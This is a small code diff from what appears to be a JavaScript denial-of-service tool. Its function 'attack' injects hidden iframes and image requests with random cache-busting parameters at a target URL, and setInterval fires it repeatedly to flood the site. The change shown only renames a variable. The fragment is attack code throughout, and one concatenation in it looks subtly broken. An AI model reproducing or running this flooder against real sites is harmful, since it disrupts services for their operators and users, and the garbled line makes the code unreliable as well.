@@ -11,8 +11,8 @@ function attack() {
     document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';
   
 
-                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
-					img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);
+                    pic.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
+					pic.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);
 
 }
 setInterval(attack, speed);  
